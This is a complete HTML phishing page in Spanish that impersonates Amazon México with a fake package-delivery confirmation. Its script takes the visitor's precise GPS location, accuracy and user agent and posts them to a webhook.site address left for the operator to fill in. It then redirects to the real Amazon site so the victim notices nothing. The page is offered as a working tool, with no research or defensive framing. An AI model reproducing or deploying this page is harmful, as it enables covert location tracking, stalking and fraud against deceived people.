<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>📦 Amazon - Confirmar recepción de tu paquete</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f4f4f4; margin:0; padding:20px; text-align:center; }
    .card { background:white; max-width:420px; margin:40px auto; padding:40px 20px; border-radius:16px; box-shadow:0 15px 40px rgba(0,0,0,0.15); }
    h1 { color:#232f3e; font-size:24px; }
    button { background:#FF9900; color:white; border:none; padding:18px 40px; font-size:20px; border-radius:8px; cursor:pointer; width:100%; max-width:300px; }
    button:hover { background:#e68a00; }
    #resultado { margin-top:20px; font-size:16px; color:#00a651; font-weight:bold; }
  </style>
</head>
<body>
  <div class="card">
    <h1>📦 Tu paquete está listo para entregar</h1>
    <p><strong>Pedido #MX-7843921</strong><br>Calle Falsa 123, Zapopan, Jalisco</p>
    <p>Para evitar que se devuelva, confirma tu ubicación exacta:</p>
    <button onclick="obtenerUbicacion()">✅ Confirmar recepción ahora</button>
    <div id="resultado"></div>
    <p style="font-size:12px; color:#666; margin-top:30px;">Amazon México • Seguro • 2026</p>
  </div>

  <script>
    function obtenerUbicacion() {
      const resultado = document.getElementById('resultado');
      resultado.textContent = "Solicitando ubicación... (iOS/Safari mostrará el popup)";

      if (!navigator.geolocation) {
        resultado.textContent = "❌ Tu navegador no soporta geolocalización";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude.toFixed(6);
          const lon = position.coords.longitude.toFixed(6);
          const acc = Math.round(position.coords.accuracy);

          resultado.innerHTML = `✅ ¡Ubicación capturada!<br>📍 Lat: ${lat}<br>📍 Lon: ${lon}<br>🔬 Precisión: ±${acc} metros`;

          // === ENVÍO DE DATOS (cámbialo por tu webhook.site) ===
          const webhookURL = "https://webhook.site/TU-ID-AQUI"; // ← cambia esto
          fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              lat: lat,
              lon: lon,
              accuracy: acc,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
              device: /iPhone|iPad/.test(navigator.userAgent) ? "iOS" : "Otro"
            })
          }).catch(() => {});

          // Redirección realista después de 2 segundos
          setTimeout(() => { window.location.href = "https://www.amazon.com.mx"; }, 2000);
        },
        (error) => {
          let msg = "";
          switch(error.code) {
            case error.PERMISSION_DENIED:
              msg = "❌ Permiso denegado. Toca 'Permitir' en el popup de iOS/Safari.";
              break;
            case error.POSITION_UNAVAILABLE:
              msg = "❌ Ubicación no disponible (GPS apagado o sin señal).";
              break;
            case error.TIMEOUT:
              msg = "❌ Tiempo agotado. Intenta de nuevo.";
              break;
            default:
              msg = "❌ Error: " + error.message;
          }
          resultado.textContent = msg;
        },
        {
          enableHighAccuracy: true,   // GPS real en iOS 26
          timeout: 15000,
          maximumAge: 0
        }
      );
    }
  </script>
</body>
</html>
